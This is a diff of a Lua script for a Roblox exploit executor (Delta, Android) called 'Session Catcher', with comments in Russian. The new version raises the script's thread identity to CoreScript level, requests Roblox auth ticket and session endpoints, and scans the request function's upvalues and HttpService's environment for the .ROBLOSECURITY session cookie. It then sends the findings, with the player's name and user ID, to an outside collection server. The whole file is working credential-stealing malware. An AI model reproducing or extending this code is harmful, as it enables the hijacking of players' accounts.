@@ -1,6 +1,6 @@
 -- ============================================================
 --  Session Catcher — Delta Executor (Android)
---  v7 — Auth Ticket extraction via hookmetamethod
+--  v8 — setidentity + game:HttpPost to auth endpoint
 -- ============================================================
 
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
@@ -11,113 +11,135 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local hookResults = {}
+local results = {}
 
 -- -----------------------------------------------------------
--- Hook __namecall для перехвата ответа HttpPost
+-- 1. Проверяем текущий identity
 -- -----------------------------------------------------------
+results.currentIdentity = "N/A"
 pcall(function()
-    if hookmetamethod and getnamecallmethod then
-        local oldNamecall
-        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
-            local method = getnamecallmethod()
-            local args = {...}
-            
-            if method == "HttpPost" and type(args[1]) == "string" 
-               and string.find(args[1], "auth.roblox") then
-                local results = {oldNamecall(self, ...)}
-                hookResults["numReturns"] = #results
-                hookResults["args"] = tostring(args[1])
-                for i, r in ipairs(results) do
-                    hookResults["return_" .. i .. "_type"] = type(r)
-                    hookResults["return_" .. i .. "_value"] = tostring(r):sub(1, 1000)
-                end
-                return unpack(results)
-            end
-            
-            return oldNamecall(self, ...)
-        end)
-    end
+    if getidentity then results.currentIdentity = tostring(getidentity()) end
 end)
+
+-- -----------------------------------------------------------
+-- 2. Повышаем identity до 7 (уровень CoreScript)
+-- -----------------------------------------------------------
+pcall(function() if setidentity then setidentity(7) end end)
+pcall(function() if setthreadidentity then setthreadidentity(7) end end)
+pcall(function() if setthreadcontext then setthreadcontext(7) end end)
+pcall(function() if set_thread_identity then set_thread_identity(7) end end)
+pcall(function() if set_thread_context then set_thread_context(7) end end)
 
 task.wait(0.5)
 
--- -----------------------------------------------------------
--- Вызываем auth ticket endpoint
--- -----------------------------------------------------------
-local directResult = {}
+results.newIdentity = "N/A"
+pcall(function()
+    if getidentity then results.newIdentity = tostring(getidentity()) end
+end)
 
--- Попытка 1: game:HttpPost без content-type
+-- -----------------------------------------------------------
+-- 3. game:HttpPost к auth endpoint (теперь с identity 7)
+-- -----------------------------------------------------------
 pcall(function()
     local ok, resp = pcall(function()
-        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "")
+        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
     end)
-    directResult["post1_type"] = type(resp)
-    directResult["post1_ok"] = ok
-    directResult["post1_value"] = tostring(resp):sub(1, 1000)
+    results.postAuth_ok = tostring(ok)
+    results.postAuth_value = tostring(resp):sub(1, 1000)
 end)
 
 task.wait(1)
 
--- Попытка 2: game:HttpPost с content-type
-pcall(function()
-    local ok, resp = pcall(function()
-        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "{}", "application/json")
-    end)
-    directResult["post2_type"] = type(resp)
-    directResult["post2_ok"] = ok
-    directResult["post2_value"] = tostring(resp):sub(1, 1000)
-end)
-
-task.wait(1)
-
--- Попытка 3: game:HttpGet (GET вместо POST — может вернуть что-то)
+-- -----------------------------------------------------------
+-- 4. game:HttpGet к auth endpoint (с identity 7)
+-- -----------------------------------------------------------
 pcall(function()
     local ok, resp = pcall(function()
         return game:HttpGet("https://auth.roblox.com/v1/authentication-ticket")
     end)
-    directResult["get_type"] = type(resp)
-    directResult["get_ok"] = ok
-    directResult["get_value"] = tostring(resp):sub(1, 1000)
+    results.getAuth_ok = tostring(ok)
+    results.getAuth_value = tostring(resp):sub(1, 1000)
 end)
 
 task.wait(1)
 
--- Попытка 4: httppost (Delta функция)
+-- -----------------------------------------------------------
+-- 5. httppost с правильным синтаксисом (Instance first)
+-- -----------------------------------------------------------
 pcall(function()
-    if httppost then
-        local ok, resp = pcall(httppost, "https://auth.roblox.com/v1/authentication-ticket", "")
-        directResult["delta_post_type"] = type(resp)
-        directResult["delta_post_ok"] = ok
-        directResult["delta_post_value"] = tostring(resp):sub(1, 1000)
+    local ok, resp = pcall(httppost, game, "https://auth.roblox.com/v1/authentication-ticket", "")
+    results.httppostAuth_ok = tostring(ok)
+    results.httppostAuth_value = tostring(resp):sub(1, 1000)
+end)
+
+task.wait(1)
+
+-- -----------------------------------------------------------
+-- 6. game:HttpGet на другие auth endpoints
+-- -----------------------------------------------------------
+local extraEndpoints = {
+    "https://www.roblox.com/api/users/validate",
+    "https://www.roblox.com/my/settings/json",
+    "https://www.roblox.com/login/get-session-data",
+    "https://auth.roblox.com/v1/user/session",
+    "https://auth.roblox.com/v1/sessions"
+}
+
+for _, url in ipairs(extraEndpoints) do
+    pcall(function()
+        local ok, resp = pcall(function()
+            return game:HttpGet(url)
+        end)
+        local key = url:gsub("https://", ""):gsub("/", "_"):gsub("%.", "_")
+        results["get_" .. key .. "_ok"] = tostring(ok)
+        results["get_" .. key .. "_value"] = tostring(resp):sub(1, 500)
+    end)
+    task.wait(0.3)
+end
+
+-- -----------------------------------------------------------
+-- 7. getupvalues на request функцию — может кука в upvalue
+-- -----------------------------------------------------------
+pcall(function()
+    if getupvalues then
+        local upvals = getupvalues(request)
+        if upvals then
+            local upvalDump = {}
+            for i, v in pairs(upvals) do
+                if type(v) == "string" then
+                    if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
+                        upvalDump["UPVAL_COOKIE_" .. tostring(i)] = v:sub(1, 500)
+                    else
+                        upvalDump[tostring(i)] = v:sub(1, 100)
+                    end
+                else
+                    upvalDump[tostring(i)] = type(v) .. ":" .. tostring(v):sub(1, 100)
+                end
+            end
+            results.requestUpvalues = upvalDump
+        end
     end
 end)
 
-task.wait(1)
-
--- Попытка 5: request() к auth ticket — вернёт заголовки ответа
+-- -----------------------------------------------------------
+-- 8. getsenv на HttpService
+-- -----------------------------------------------------------
 pcall(function()
-    local ok, resp = pcall(httpRequest, {
-        Url = "https://auth.roblox.com/v1/authentication-ticket",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = ""
-    })
-    if ok and resp then
-        directResult["request_status"] = tostring(resp.StatusCode)
-        directResult["request_body"] = tostring(resp.Body):sub(1, 500)
-        -- Заголовки ответа!
-        if resp.Headers then
-            local headerDump = {}
-            for k, v in pairs(resp.Headers) do
-                headerDump[tostring(k)] = tostring(v):sub(1, 500)
+    if getsenv then
+        local senv = getsenv(game:GetService("HttpService"))
+        if senv then
+            local senvDump = {}
+            for k, v in pairs(senv) do
+                local kStr = tostring(k)
+                local vStr = tostring(v)
+                if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") or vStr:find("cookie") then
+                    senvDump[kStr] = "COOKIE: " .. vStr:sub(1, 500)
+                else
+                    senvDump[kStr] = type(v) .. ":" .. vStr:sub(1, 100)
+                end
             end
-            directResult["request_headers"] = headerDump
+            results.httpServiceSenv = senvDump
         end
-    else
-        directResult["request_error"] = tostring(resp):sub(1, 300)
     end
 end)
 
@@ -127,8 +149,7 @@ end)
 local payload = {
     username = LocalPlayer.Name,
     userId = LocalPlayer.UserId,
-    hookResults = hookResults,
-    directResult = directResult,
+    results = results,
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
 
@@ -141,4 +162,4 @@ pcall(function()
     })
 end)
 
-print("[Catcher] v7 auth ticket probe sent")
+print("[Catcher] v8 identity probe sent")
